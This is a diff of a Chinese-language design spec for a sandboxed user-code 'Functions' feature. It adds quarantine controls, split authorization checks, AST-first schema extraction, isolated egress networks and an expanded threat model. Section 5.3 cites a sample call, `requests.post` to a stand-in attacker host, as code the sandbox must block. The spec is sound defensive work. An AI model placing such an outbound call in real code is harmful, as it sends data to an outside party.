@@ -134,7 +134,8 @@
 | `description` | `text` | 同上 |
 | `icon_data_url` | `text` nullable | base64 inline icon |
 | `author_user_id` | `bigint FK users` | 寫這個 Function 的 dev |
-| `status` | `enum('draft','enabled','disabled')` | dev 寫到一半 = draft；author 可 self-publish 至 enabled；admin 可 disable |
+| `status` | `enum('draft','enabled','disabled','quarantined')` | dev=draft → self-publish enabled；author 可自行 disable（暫停）；admin 可 disable（同 author 暫停）或 **quarantine**（疑似濫用、code 鎖到 author+admin） |
+| `disabled_reason` | `text` nullable | admin 在 disable / quarantine 時填入；audit 可查 |
 | `latest_version_id` | `bigint` (no FK; denormalized cache) | 跟 `versions` 沒 FK 關係，避免 circular FK；read 時 LEFT JOIN，找不到視為無版本 |
 | `forked_from_id` | `bigint FK self`, nullable | marketplace fork 來源 |
 | `tags` | `text[]` | marketplace 搜尋；空陣列允許 |
@@ -161,13 +162,13 @@
 Append-only 強制：Postgres trigger 攔截 UPDATE/DELETE。
 
 **並發控制**：save 新版本時 wrap 在 transaction：
-1. `pg_advisory_xact_lock(hashtext('actfn:' || function_id))` — per-function 鎖、不影響其他 function
+1. `pg_advisory_xact_lock(:NS, :function_id)` — namespaced 2-int advisory key；`NS` 是常數（v1 用 `42` 保留給 action_function 表族）；不依賴 hashtext 避免碰撞
 2. `version_no = (SELECT COALESCE(MAX(version_no),0) + 1 FROM action_function_versions WHERE function_id = :fid)`
 3. INSERT versions row → 取回 `id`
 4. UPDATE `action_functions.latest_version_id = :id`
 5. COMMIT（advisory lock 自動釋放）
 
-避免 concurrent save 同 function 撞 unique key。
+避免 concurrent save 同一 function 撞 unique key；不同 function 並行不互相阻擋。
 
 **Schema 抽取（valves_schema_json / actions_meta_json / metadata_json）**：CSP **不**自己 exec user code；改 POST 到 worker `/extract-meta`（同 sandbox 內 introspect）取回 JSON 後再 INSERT。詳見 §5.3。
 
@@ -229,11 +230,17 @@ Index：`(function_id, status)`、`(status, created_at DESC)` 給 admin 看 open
 
 | 欄位 | `user` | `developer` | `admin` |
 |---|---|---|---|
-| metadata（title / description / icon / author / tags / status） | ✅ | ✅ | ✅ |
-| **code**（含 versions table 的 `code` 欄位） | ❌ | enabled/disabled ✅；draft 僅 author | ✅ |
+| metadata（title / description / icon / author / tags / status / disabled_reason） | ✅ | ✅ | ✅ |
+| **code**（含 versions table 的 `code` 欄位） | ❌ | enabled/disabled ✅；draft 僅 author；**quarantined 僅 author+admin** | ✅ |
 | valves schema | ✅ | ✅ | ✅ |
 | valves values（解密後） | ❌ | ❌ | ✅ |
 | audit runs | 自己跑的 ✅ | 自己 + own function 的 ✅ | ✅ |
+
+**`quarantined` 狀態語意**：admin 認定 function 有疑慮（abuse report 屬實 / classified leak / 釣魚 etc.）時切過去，效果：
+- 不出現在 `enabled-actions`（chat toolbar 看不到）
+- code 對其他 developer 隱藏（防止複製手法）
+- author 仍可看自己的 code（修正用）
+- 一旦切到 quarantined、不再能 self-publish 回 enabled（必須 admin 解除）
 
 「fork」=「INSERT 新 row + `forked_from_id`」+「duplicate code 為新 fork 的 v1」；只能 fork **enabled** 的 function。fork 出來的副本回到 `draft`、author 是 forker。
 
@@ -274,6 +281,8 @@ Index：`(function_id, status)`、`(status, created_at DESC)` 給 admin 看 open
 |---|---|---|---|
 | `POST` | `/api/functions/:slug/fork` | `developer`+ | 複製成自己的；source 必須 `status=enabled` |
 | `POST` | `/api/functions/:slug/report` | any logged-in | body: `{reason}`；插入 reports 表 + audit_logs 高階紀錄 |
+| `POST` | `/api/functions/:slug/quarantine` | `admin` | body: `{reason}`；status → `quarantined`；code 自動鎖到 author+admin |
+| `POST` | `/api/functions/:slug/unquarantine` | `admin` | status → `disabled`（不直接回 enabled，author 自己決定要不要 re-publish） |
 | `GET` | `/api/functions/reports?status=open` | `admin` | admin 處理 queue |
 | `PATCH` | `/api/functions/reports/:id` | `admin` | 改 status / acknowledge |
 
@@ -296,15 +305,43 @@ Request body：
 }
 ```
 
-**前置授權檢查（依序，任一失敗 → 403 / 404，不漏訊息以免 enumeration）**：
+**前置授權檢查 — 兩條路徑（chat_message vs test_console），任一失敗 → 403 / 404、不漏訊息以免 enumeration**：
 
-1. `resolve_caller(JWT)` → caller
-2. `lookup_function(slug)` → function（404 if not found）
-3. RBAC：function `status=enabled` **AND** `lifecycle 條件`；`test_mode=true` 例外：caller 必須是 author 或 admin、function 可以是 disabled / draft / enabled
-4. **`conversation_service.verify_access(caller, body.context.conversation_id)`** — 既有 owner / admin / share / handoff gate（`myCSPPlatform/backend/app/services/conversation_service.py:38`）
-5. **`message_service.verify_message_in(message_id, conversation_id)`** — message 必須屬於該 conversation
-6. **`message.role == 'assistant'`** — Action 只能掛在 assistant 訊息底下
-7. **Classified gate**：if `conversation.classified == True`，caller 必須有對應 clearance（既有 logic 沿用，不另寫）
+```
+共用前置：
+  1. resolve_caller(JWT) → caller
+  2. lookup_function(slug) → function（404 if not found）
+
+if test_mode=true:                           if test_mode=false (chat_message):
+  3a. caller 必須是 function.author          3b. function.status == 'enabled'
+      OR admin（否則 403）                       （否則 403）
+  4a. function.status 可以是                 4b. conversation_service.get_conversation
+      draft/enabled/disabled                     (caller, body.context.conversation_id)
+      （含 quarantined → 仍 author/admin         → 走既有 _check_access()
+        可看自己的）                              owner/admin only（v1）
+  5a. body.context 視為 synthetic：           5b. message belongs_to_conversation
+      conversation_id / message_id 可空         (message_id, conversation_id)
+      audit 紀錄 context_type=test_console     5c. message.role == 'assistant'
+                                              5d. classified gate（v1：沿用既有
+                                                  conversation_service 行為，目前
+                                                  只有 owner/admin；clearance
+                                                  / share / handoff 是 future work）
+```
+
+**v1 owner/admin gate 說明**（Codex round-2 M4）：
+- 目前 `myCSPPlatform/backend/app/services/conversation_service.py:38, 357` 的 `_check_access()` 只有 `owner | admin`，沒有 share / handoff / clearance gate
+- v1 spec 明列「complies with whatever conversation_service.get_conversation() enforces today」，未來 conversation_service 加 share / handoff / clearance gate 時、Functions 自動跟著（沒有獨立 reimplement）
+- 不要造輪子：classified clearance 在 conversation_service 層級實作；Functions 依賴上游
+- v2 follow-up：等 share / handoff conversation_service 改寫完，順手把 Functions E2E 測試擴充
+
+**測試對應**：
+- chat_message + caller is owner ✅
+- chat_message + caller is non-owner non-admin → 403
+- chat_message + message.role='user' → 403
+- chat_message + message 不在 conversation → 403
+- test_console + caller is author ✅（function 可 draft/disabled/quarantined）
+- test_console + caller is not author and not admin → 403
+- test_console + body.context.conversation_id 空 → 不報錯（synthetic）
 
 通過後才進 worker 派送與 SSE relay。
 
@@ -390,25 +427,63 @@ Browser                        CSP /run                        worker /exec
 - StreamingResponse async 把 stdout 每行轉成 SSE `data:` line
 - 結束 wait 2s 後強制 wait
 
-### 5.3 Worker `/extract-meta` endpoint（schema 抽取）
+### 5.3 Worker `/extract-meta` endpoint（schema 抽取，**比 /exec 更嚴**）
 
-**為何不在 CSP 做**：在 CSP 端 `import` 或 `compile + exec` user code 就是把 save path 變成 RCE（Codex finding #6）。改在 worker 端、在跟正式 run 同等 sandbox 內 introspect。
+**為何不在 CSP 做**：CSP 端 `import` 或 `compile + exec` user code 就是把 save path 變成 RCE（Codex round-1 #6）。
+
+**為何 /extract-meta 必須比 /exec 更嚴**：save path 觸發頻率高（每次 dev 按存檔）、不該成為定期 trigger top-level code 對 allowlisted host 做 side effect 的入口（Codex round-2 H2）。
+
+**Strategy — 兩階段**：
+
+**Stage 1 — Static AST parse（優先）**：
+- 用 `ast.parse` + walker 讀以下內容（**不 exec**）：
+  - 模組 docstring → `metadata_json`（title / version / description / author）
+  - `class Action` 的 `actions = [{...}]` literal list → `actions_meta_json`（list 必須是 ast.Constant / ast.Dict literal，否則放棄、進 stage 2）
+  - `class Valves(BaseModel)` 的欄位宣告（type annotation + Field(default=...) literal）→ 直接組 JSON Schema
+- 大部分 Function 都能停在 stage 1（你同事的 `填入文字助手` 範例就是純 literal、不需 exec）
+
+**Stage 2 — Restricted sandbox exec（fallback）**：
+- 觸發條件：stage 1 偵測到 dynamic 結構（Valves 用 `Annotated[X, Field(...)]` 含複雜 default、actions list 是 comprehension 等）
+- Profile（**比正式 run 嚴格**）：
+  - **Egress 完全 deny**：worker 跑 extract 時改連到「extract-meta-net」（另一個 docker network、`internal: true`、**無** egress proxy）；連 allowlisted host 都連不到
+  - **Timeout 3s**（vs run 的 30s）
+  - **RSS 64MB**（vs run 的 256MB）
+  - **不傳 valves / `__user__` / `__metadata__`**（runtime.py 進 extract mode 時這些都不注入）
+  - **Stdout / stderr cap 16KB**（多砍掉、防止 fork bomb 把 log 灌爆）
+  - **不執行 `Action.action()`**：runtime.py extract mode 只 `exec` 模組頂層、`Action.actions` 讀屬性、`Valves` 呼叫 `.model_json_schema()`，**不**呼叫 instance.action()
+- 即使 user code 在 module top-level 跑了 side effect（如 `requests.post('https://attacker.internal')`），也因為 extract-meta-net 沒任何出口而失敗
 
 **Flow**：
 ```
 CSP receives POST /api/functions/:slug/versions {code}
-  ↓ slug regex / RBAC / size 限制
+  ↓ slug regex / RBAC / size 限制 (e.g. <128KB)
 CSP POST worker /extract-meta {code}
   ↓
-worker spawn subprocess (同 runtime.py harness、同 sandbox 設定):
-   - exec user code
-   - 讀 Action.actions（list of {id, name, icon_url}）
-   - 讀 Valves（pydantic model 的 .schema()）
-   - 讀 docstring frontmatter
+worker stage 1: ast static parse
+   - 成功 → return JSON
+   - 偵測 dynamic feature → stage 2
+worker stage 2: spawn subprocess in extract-mode
+   - extract network (internal: true, no egress)
+   - 3s timeout, 64MB rss, no valves/user/metadata
+   - exec module top-level
+   - read Action.actions (attribute), Valves.model_json_schema() (method call)
+   - 不 instantiate / 不 call action()
   return JSON: {actions_meta_json, valves_schema_json, metadata_json, errors[]}
   ↓
 CSP 收到 JSON → INSERT versions row（plain string + JSON，**不 exec**）
 ```
+
+**Network 拓樸補充**（在 §5.7 的圖之外）：
+
+```
+┌────── network: anila-functions-extract-net ──────┐
+│  anila-functions-worker  (extract mode)          │   ← internal: true, 完全沒出口
+└──────────────────────────────────────────────────┘
+```
+
+worker 同時是兩個 network 的成員：在 `/exec` 跑時 spawn subprocess 走 functions-net（有 egress proxy）；在 `/extract-meta` 跑時 spawn subprocess 走 extract-net（無 egress）。具體做法：worker 進程本身在兩個 network 上、subprocess 透過 `unshare(CLONE_NEWNET)` 或啟動時注入 `network_namespace` 切換（Python 端用 `os.unshare` + `subprocess` 在指定 netns 執行）。
+
+**Implementation 簡化選項（v1 OK）**：跑兩個 worker container 副本，一個叫 `anila-functions-worker-exec`（連 functions-net）、一個叫 `anila-functions-worker-extract`（連 extract-net），CSP 路由 `/exec` 與 `/extract-meta` 到不同 service。Operationally 比 namespace 切換簡單。
 
 **Worker `/extract-meta` request**：`{code: string}` + `X-Functions-Secret` header
 **Response**：
@@ -417,11 +492,12 @@ CSP 收到 JSON → INSERT versions row（plain string + JSON，**不 exec**）
   "actions_meta_json": [{"id": "my-btn", "name": "...", "icon_url": "..."}],
   "valves_schema_json": {"$schema": "...", "type": "object", "properties": {...}},
   "metadata_json": {"title": "...", "description": "...", "version": "1.0"},
+  "extract_strategy": "ast" | "sandbox",
   "errors": []
 }
 ```
 
-如果 `errors` 非空（語法錯、缺 `class Action`、`Valves` 不是 BaseModel 等），CSP 端 reject save 並回 4xx 給前端、不 INSERT version。
+如果 `errors` 非空（語法錯、缺 `class Action`、`Valves` 不是 BaseModel、stage 2 timeout 等），CSP 端 reject save 並回 4xx 給前端、不 INSERT version。
 
 ### 5.4 `runtime.py`（worker image 內建 wrapper）
 
@@ -483,14 +559,21 @@ asyncio.run(main())
 
 **`host_command` 白名單動詞集**（v1）：
 
-| Verb | Args Schema | 行為 |
-|---|---|---|
-| `composer.set_text` | `{text: string}` | 取代 chat input 全文 |
-| `composer.insert_text` | `{text: string, at?: 'cursor' \| 'end'}` (default: `cursor`) | 在 cursor / end 插入 |
-| `clipboard.copy` | `{text: string}` | 複製到剪貼簿 |
-| `citation.open` | `{citation: Citation}`（既有 Citation type） | push CitationsDrawer state |
-| `chat.show_modal` | `{title: string, content_md: string}` | 顯示 markdown modal（content 走 DOMPurify） |
-| `link.open` | `{url: string, target?: '_blank'}` | 開新分頁；URL 必須 match `LINK_OPEN_ALLOWLIST` regex（compose env 配置；預設只允 https + 內網 host） |
+| Verb | Args Schema | 行為 | User activation |
+|---|---|---|---|
+| `composer.set_text` | `{text: string}` | 取代 chat input 全文 | 不需要 |
+| `composer.insert_text` | `{text: string, at?: 'cursor' \| 'end'}` (default: `cursor`) | 在 cursor / end 插入 | 不需要 |
+| **`clipboard.copy`** | `{text: string, preview?: string}` | **顯示 toast**「Click to copy: <preview>」**user 點 toast 才複製**（user activation 要求）；preview 沒給就用 text 前 40 字元 | **需要**（fallback UX 內建） |
+| `citation.open` | `{citation: Citation}`（既有 Citation type） | push CitationsDrawer state | 不需要 |
+| `chat.show_modal` | `{title: string, content_md: string}` | 顯示 markdown modal（content 走 DOMPurify） | 不需要 |
+| **`link.open`** | `{url: string, label?: string}` | URL 先驗 allowlist regex；通過 → **顯示 toast**「Open <label or url>」**user 點 toast 才開新分頁**（避開 popup blocker） | **需要**（fallback UX 內建） |
+
+`★ Browser user-activation 處理`（Codex round-2 L7）：
+- `clipboard.copy` 跟 `link.open` 在 modern browser 都需要 transient user activation；async SSE dispatch 觸發時，原本 click handler 已 return、activation lost
+- v1 設計：這兩個 verb 都不嘗試「直接執行」，而是 **render 一個 click-to-confirm UI element**（toast / inline button），把 user activation 從「原本的 click」延遲到「user 點這個 toast」
+- 文字 / URL 來自 server-emitted args，仍由 dev 控制；user 看得到要 copy / open 什麼才點
+- 額外好處：對 user 也是 anti-phishing 護欄（看清楚要 copy 什麼 / 開哪個 URL 才確認）
+- 失敗 UX：如果 toast 5 秒沒被點 → 自動消失、emit 一筆 audit metric `function_host_command_unconfirmed_total{verb}`，不視為錯誤（user 可能就是不想做）
 
 **前後端兩層驗證**：
 - CSP 端：read SSE chunk 後 → 驗 `data.type=='host_command'` 時 `verb` 在白名單、args 滿足對應 schema、URL/text 字串合理（長度 / 字元集）→ 通過才轉發
@@ -514,17 +597,72 @@ asyncio.run(main())
 | **Seccomp** | 自訂 profile（block: `ptrace`, `mount`, `unshare`, `kernel_module`, `bpf`, `clone3`）；以 docker default 為基礎收緊 | syscall 不允 → SIGSYS |
 | **AppArmor / SELinux**（哪個 host 有就用） | confine profile，禁止 `mount`, `ptrace`, capability raise | — |
 | `--security-opt=no-new-privileges` | enabled | 阻止 setuid escalation |
-| Subprocess env | 完全 scrub，**只**留 `PYTHONDONTWRITEBYTECODE=1` 與 worker 註明的 minimal vars；不繼承 `LD_PRELOAD` / `PATH` extras / `HTTP_PROXY` 等可被濫用變數 | — |
+| Subprocess env | scrub 大部分；**保留** `HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY`（純為 dev 體驗讓 httpx/requests 自動走 proxy；**這不是安全邊界**）；scrub `LD_PRELOAD` / `PATH` extras / 任何認證 token | — |
 | Worker container 不掛 `docker.sock` / `/var/run/docker.sock` | 強制 | docker socket bind = container escape primitive |
 | Concurrent runs | 8（worker pool semaphore） | 第 9 個 → error: queue_full |
 
-**Outbound proxy / egress allowlist**：
+**Outbound egress 控制 — 安全邊界在網路拓樸，不在 env vars**：
 
-- Compose 加一個 outbound proxy（squid 或 envoy sidecar；choice 列在 §10 open question）
-- Proxy 配置從 ENV `ANILA_FUNCTIONS_EGRESS_ALLOWLIST` 讀（CSV `host:port`，例：`csp:8000,router:9000,internal-lint.intra:443`）
-- Worker container 內 `HTTP_PROXY` / `HTTPS_PROXY` / `NO_PROXY` 指向 sidecar；user code 用 httpx/requests 自然走 proxy
-- 直接 raw socket 連線會被 docker network 規則 drop（worker container 只能對 proxy 容器發 outbound）
-- Public internet 預設**不通**；要新增 host 須改 deploy config（admin 動作）
+⚠️ Env vars（`HTTP_PROXY` 等）是 user code 自願使用的便利機制，user code 可以 `del os.environ['HTTP_PROXY']` 或繞 socket 庫直接連、env 不能擋。**真正的 enforcement 必須在 Linux network layer**。
+
+**v1 採用「分裂網路拓樸」做法（不依賴 host iptables，純 docker compose 達成）**：
+
+```
+┌──────────────────────── docker-compose ────────────────────────┐
+│                                                                  │
+│   ┌────── network: anila-internal ──────┐                        │
+│   │  csp                                │                        │
+│   │  router                             │                        │
+│   │  csp-db                             │                        │
+│   │  anila-ui                           │                        │
+│   │  ingestion-worker                   │                        │
+│   │  ...                                │                        │
+│   └─────────────────────┬──────────────┘                        │
+│                          │                                       │
+│                          │  (only egress proxy bridges)         │
+│                          ▼                                       │
+│   ┌────── network: anila-functions-net ─────────┐               │
+│   │  anila-functions-worker  ← only this here   │               │
+│   │  anila-functions-egress  ← bridges to      │               │
+│   │                            anila-internal  │               │
+│   └──────────────────────────────────────────────┘               │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+```
+
+- **`anila-functions-worker` 只連 `anila-functions-net`**，**不**連 `anila-internal`
+- **`anila-functions-egress`（squid）連兩個 network**：對 worker 提供 proxy；對 internal network 拿 allowlist 內的 host
+- 結果：worker 任何 user code 想連任何 host（含 raw socket / 跳過 HTTP_PROXY）→ 唯一 reachable 的是 egress proxy 容器；連其他 IP 直接 `connection refused`（route 不存在）
+- `anila-functions-egress` ACL 從 `ANILA_FUNCTIONS_EGRESS_ALLOWLIST`（CSV `host:port`）讀，proxy CONNECT / GET 不在白名單 → reject
+- Public internet 預設**不通**（egress proxy 沒 allowlist 任何外網 host 就連不出去）；要新增 host 改 deploy config
+
+**為什麼這樣比 host iptables 簡單**：
+- 純 docker network、無需 host 層改 firewall
+- 即使 worker 的 user code disable 自身 HTTP_PROXY、嘗試直接 raw socket 連 8.8.8.8、結果都一樣：`connection refused`（沒 route）
+
+**docker-compose 配置點**：
+```yaml
+networks:
+  anila-internal:
+    driver: bridge
+  anila-functions-net:
+    driver: bridge
+    internal: true   # 不連 docker0、無 NAT 出 host
+
+services:
+  anila-functions-worker:
+    networks: [anila-functions-net]   # 只在這
+    environment:
+      HTTP_PROXY: http://anila-functions-egress:3128
+      HTTPS_PROXY: http://anila-functions-egress:3128
+      NO_PROXY: ""
+
+  anila-functions-egress:
+    image: squid:5
+    networks: [anila-internal, anila-functions-net]   # 跨兩網
+```
+
+**註**：`networks.anila-functions-net.internal: true` 讓這個 network 沒有 NAT、沒有 default gateway 出 host，徹底隔離。worker 的唯一連通對象是同 network 上的 egress proxy。
 
 ---
 
@@ -627,7 +765,7 @@ Tabs：
 | 動作 | `user` | `developer` | `admin` |
 |---|---|---|---|
 | 看 Functions 列表 / Library（僅 metadata） | ✅ | ✅ | ✅ |
-| 看單一 Function **code**（read-only） | ❌ | enabled/disabled ✅；draft 僅 author | ✅ |
+| 看單一 Function **code**（read-only） | ❌ | enabled/disabled ✅；draft 僅 author；**quarantined 僅 author+admin** | ✅ |
 | 用 enabled Function | ✅ | ✅ | ✅ |
 | 看 enabled-actions（chat toolbar render） | ✅ | ✅ | ✅ |
 | 建新 Function | ❌ | ✅ | ✅ |
@@ -656,9 +794,13 @@ Tabs：
 | T9 | Marketplace 釣魚（命名相似 slug） | 誤觸發惡意 button | UI 強制顯示 author + forked_from + "new" 標示；user role 看不到 code 也降低偽造能力；abuse report 入口 |
 | T10 | SQL injection（slug / tag） | DB compromise | ORM + parameterized；slug regex `^[a-z0-9][a-z0-9-]{0,63}$`；tag 限 20 字元 |
 | **T11** | **Social engineering via host_command**（dev 寫 button 把 composer 設成釣魚字串、彈 modal 假冒系統訊息、link.open 騰空跳到惡意站） | 使用者被誘導執行操作 | host_command 白名單動詞（無 raw HTML / JS）；URL allowlist regex；modal content 走 DOMPurify；audit 全文（事後追源）；abuse report；admin disable kill switch；user role 看不到 code 仍可看 metadata 警示「button 來自 author X」 |
-| **T12** | **CSP exec user code at save path（schema extraction RCE）** | save endpoint 變 RCE | CSP 不 import / exec user code；schema extraction 走 worker `/extract-meta`（同 sandbox） |
-| **T13** | **`/run` 缺 conversation/message ownership 驗證** | horizontal authz、user A 對 user B 的 message 觸發 Action | §4.5 明列前置授權 7 步；複用 conversation_service 既有 gate；classified gate 沿用 |
-| **T14** | **circular FK / version_no 並發撞 unique key** | save 失敗或邏輯混亂 | `latest_version_id` 去掉 FK；advisory lock per-function + INSERT 在 transaction |
+| **T12** | **CSP exec user code at save path（schema extraction RCE）** | save endpoint 變 RCE | CSP 不 import / exec user code；schema extraction 走 worker `/extract-meta`；偏好 static AST，必要時才 sandbox exec、且 profile **比 /exec 更嚴**（無 egress、無 valves、3s timeout、64MB） |
+| **T13** | **`/run` 缺 conversation/message ownership 驗證** | horizontal authz、user A 對 user B 的 message 觸發 Action | §4.5 明列前置授權兩條路徑（chat_message 走完整 owner check；test_console 走 author/admin synthetic）；v1 沿用 conversation_service 既有 owner+admin gate（不畫蛇添足造輪子） |
+| **T14** | **circular FK / version_no 並發撞 unique key** | save 失敗或邏輯混亂 | `latest_version_id` 去掉 FK；namespaced advisory lock（NS=42, function_id）per-function + INSERT 在 transaction |
+| **T15** | **Egress proxy 設計自相矛盾（env scrub vs HTTP_PROXY）** | sandbox bypass | 安全邊界改成「分裂網路拓樸」：worker 在 `internal: true` 的 functions-net、唯一 reachable 是 egress proxy；env vars 只是 dev convenience、不是 enforcement |
+| **T16** | **`/extract-meta` 仍 exec user code、save 觸發 side effect** | save 變 trigger 對 allowlisted host 做 side effect | extract 用獨立 extract-meta-net（**完全沒 egress**）+ 短 timeout + 不傳 valves；偏好 static AST stage 1 |
+| **T17** | **Disabled by admin 的 code 仍對 dev 可見** | dev 複製偷學被 disable 的釣魚 code | 加 `quarantined` 第四 status；code 鎖到 author+admin；`disabled_reason` 欄位讓 admin 寫理由 |
+| **T18** | **clipboard.copy / link.open user-activation 失敗 silent** | UX 體驗破裂、user 不知道為什麼沒效 | 兩個 verb 改成 toast 二段確認：dispatch 後顯示「Click to copy / Click to open」toast、user 點才執行；自動繼承 user activation；同時是 anti-phishing 護欄 |
 
 ### 7.3 加密 / Key 管理
 
@@ -738,10 +880,15 @@ CSP 收到 worker SSE chunk 後 → push 到 SSE-to-browser 之前 → 寫 audit
 - Reserved args 注入正確
 - `__event_emitter__` async + 多次 emit 順序保留
 - timeout / OOM / non-root / 8-concurrent / queue_full
-- **`/extract-meta`：valid code → schema JSON；syntax error → errors[] 非空、不 crash**
-- **Egress proxy：worker subprocess 嘗試連 not-allowed host → connection refused（cannot bypass）**
+- **`/extract-meta` stage 1（AST）：純 literal Action.actions + Valves 欄位 → 不需 sandbox exec、回 strategy=ast**
+- **`/extract-meta` stage 2 fallback：dynamic Action.actions → 觸發 sandbox exec、回 strategy=sandbox**
+- **`/extract-meta` egress 隔離：user code top-level `requests.get('http://csp:8000')` → fail（extract-net 無 egress proxy）**
+- **`/extract-meta` 不傳 valves：runtime extract mode 不 inject `instance.valves`，user code 讀 `self.valves` 拿到 None / AttributeError**
+- **`/extract-meta` timeout：3s 後 SIGKILL、回 errors=['timeout']**
+- **網路拓樸：worker-exec 容器 `curl https://example.com` → 唯一 reachable proxy；proxy ACL 拒絕 → connection refused**
+- **網路拓樸：worker-exec 容器 `curl 8.8.8.8:443` raw socket → no route，connection failed（不依賴 HTTP_PROXY env）**
 - **`cap_drop:ALL` 生效：subprocess 無法 mount / ptrace / unshare**
-- **Subprocess env scrubbed：`os.environ` 沒有 `LD_PRELOAD` / `HTTP_PROXY` 等 sensitive vars**
+- **Subprocess env：保留 HTTP_PROXY/HTTPS_PROXY 給 dev convenience；scrub LD_PRELOAD 等 sensitive**
 - **`host_command` event 經 worker SSE 出去，不會被攔掉（worker 不驗 verb，CSP 才驗）**
 
 ### 8.4 端對端（Vitest + Playwright）— v1 必
@@ -750,6 +897,11 @@ CSP 收到 worker SSE chunk 後 → push 到 SSE-to-browser 之前 → 寫 audit
 - 點 button SSE events 串流到 DOM、`composer.set_text` 真的把 ANILA Composer 文字取代
 - **`host_command` 白名單外的 verb（前端注入嘗試）→ console warn + error toast，不 dispatch**
 - **`link.open` URL 不在 allowlist → 不開分頁、回 error**
+- **`clipboard.copy` 行為：dispatch 後顯示 toast「Click to copy: <preview>」；user 點 toast → 真複製到 clipboard；不點 → 5s 後消失**
+- **`link.open` 行為：URL 通過 allowlist → 顯示 toast「Open <label>」；user 點 toast → 開新分頁；不點 → 5s 後消失**
+- **Test Console + author 跑 quarantined function → 可以（test_mode）；非 author 跑 quarantined → 403**
+- **Quarantined function 的 code：non-author developer GET `:slug` → response 不含 code 欄位**
+- **Quarantined function：admin 解 quarantine → status='disabled'（不直接回 enabled）**
 - user 角色看到 list 但無 New Function CTA、看不到 Code tab 內容
 - Fork：library → fork enabled → my tab + forked_from（draft 起算）
 - **Fork disabled function → 403**
@@ -786,9 +938,13 @@ CSP 收到 worker SSE chunk 後 → push 到 SSE-to-browser 之前 → 寫 audit
 
 ### 9.1 New services in docker-compose
 
-新增 **2** 個 service：
+新增 **3** 個 service + **2** 個專屬 network：
 
-#### 9.1.1 `anila-functions-worker`
+**Networks**：
+- `anila-functions-net`（`internal: true`）— `anila-functions-worker-exec` + `anila-functions-egress` 共用；無 default gateway
+- `anila-functions-extract-net`（`internal: true`）— `anila-functions-worker-extract` 獨享；**無** egress proxy、完全沒出口
+
+#### 9.1.1 `anila-functions-worker-exec`（正式執行）
 
 - Base image：`python:3.12-slim`
 - Preinstalled：`fastapi`, `uvicorn`, `httpx`, `requests`, `pydantic`, `python-dateutil`, `cryptography`
@@ -799,15 +955,24 @@ CSP 收到 worker SSE chunk 後 → push 到 SSE-to-browser 之前 → 寫 audit
   - `security_opt: ["no-new-privileges:true", "seccomp:./worker-seccomp.json", "apparmor:anila-worker"]`（host 有哪個用哪個）
   - non-root user `nobody`
   - 不掛 `docker.sock` 或任何 host volume
-- Network：只在 compose internal network、不 expose 對外；outbound 必須經 `anila-functions-egress` proxy（透過 ENV `HTTP_PROXY` / `HTTPS_PROXY`）
-- ENV：`X_FUNCTIONS_SECRET`、`HTTP_PROXY=http://anila-functions-egress:3128`
+- Network：只連 `anila-functions-net`（不連 `anila-internal`）；唯一 reachable 是 egress proxy
+- ENV：`X_FUNCTIONS_SECRET`、`HTTP_PROXY=http://anila-functions-egress:3128`、`HTTPS_PROXY=同`
 
-#### 9.1.2 `anila-functions-egress`（**新 outbound proxy sidecar**）
+#### 9.1.2 `anila-functions-worker-extract`（schema 抽取，**比 exec 更嚴**）
+
+- 同 image、同 hardening
+- Network：只連 `anila-functions-extract-net`（**無** egress proxy）
+- 配置：`MAX_TIMEOUT=3`、`MAX_RSS_MB=64`、`MAX_STDOUT_KB=16`
+- 不接受 valves / __user__ / __metadata__ injection（runtime 端 strip）
+- Endpoint：只暴露 `/extract-meta`，不暴露 `/exec`
+
+#### 9.1.3 `anila-functions-egress`（**新 outbound proxy sidecar**）
 
 - 預設 squid（簡單成熟；envoy 是 v2 candidate）
 - 配置從 ENV `ANILA_FUNCTIONS_EGRESS_ALLOWLIST` 讀（CSV `host:port` 列）
 - ACL：allow listed → forward；其餘 → deny + log
-- 不接受 worker 以外的 client（compose network ACL）
+- Network：跨 `anila-internal` + `anila-functions-net` 兩個（橋）
+- 不接受 worker 以外的 client（network 層拓樸天然限制）
 - Metrics：`function_egress_blocked_total{host}` 從 access log 抽
 
 ### 9.2 CSP migrations
@@ -868,29 +1033,30 @@ CSP 收到 worker SSE chunk 後 → push 到 SSE-to-browser 之前 → 寫 audit
 預估 **4 sprint（5-6 週）**（v1 完整安全邊界版）：
 
 **Sprint 1** — Backend core + schema
-- Alembic migrations（5 表 + trigger，無 circular FK）
-- CSP endpoint：CRUD / versions（含 advisory lock）/ fork / enabled-actions / report
+- Alembic migrations（5 表 + trigger，無 circular FK，4-state status）
+- CSP endpoint：CRUD / versions（含 namespaced advisory lock）/ fork / enabled-actions / report / quarantine / unquarantine
 - AES-GCM helper + Valves endpoint（加密讀寫）
 - 客戶端 lint endpoint（slug regex / size limit）
 - Unit + integration tests
 
-**Sprint 2** — Worker + extract-meta + SSE relay + ownership
-- `anila-functions-worker` 服務（FastAPI + runtime.py + `/extract-meta`）
-- CSP `/run` SSE relay + ownership 7 步檢查 + host_command verb / args 驗證 + redaction pass
+**Sprint 2** — Worker（exec + extract）+ SSE relay + 兩條 ownership 路徑
+- `anila-functions-worker-exec` + `anila-functions-worker-extract` 兩個服務
+- runtime.py 支援 normal mode + extract mode（後者 strip valves/user/metadata）
+- `/extract-meta` 兩階段：static AST stage 1 + sandboxed exec stage 2
+- CSP `/run` SSE relay + 兩條 ownership 路徑（chat_message vs test_console）+ host_command verb / args 驗證 + redaction pass
 - Worker tests + end-to-end SSE flow test
-- Egress proxy（squid）配置 + tests
 
-**Sprint 3** — Container hardening + sandbox tests
-- Docker compose 更新（worker、egress proxy）
-- `cap_drop:ALL` + seccomp + read-only rootfs + tmpfs + non-root + env scrub
-- Sandbox 測試（不能 mount / ptrace / unshare、HTTP_PROXY 強制走 sidecar）
+**Sprint 3** — 網路拓樸 + container hardening + sandbox tests
+- Docker compose 更新（2 個 internal network、3 個服務、squid egress proxy）
+- `cap_drop:ALL` + seccomp + read-only rootfs + tmpfs + non-root + env partial-scrub
+- 拓樸測試：worker-exec 不能繞 proxy 連任何 host（即使 disable HTTP_PROXY）；worker-extract 連 proxy 都連不到
 - Stress / chaos：8 並發、subprocess kill 中途、egress allowlist 動態 update
 
 **Sprint 4** — Frontend + dogfood
-- `/admin/functions/*` 路由與頁面（list / editor / Test Console / audit / report）
+- `/admin/functions/*` 路由與頁面（list / editor / Test Console / audit / report queue / quarantine UI）
 - Monaco bundle（vite plugin、dynamic import）
-- ChatRuntime 整合（toolbar button render、host_command dispatch、abuse report）
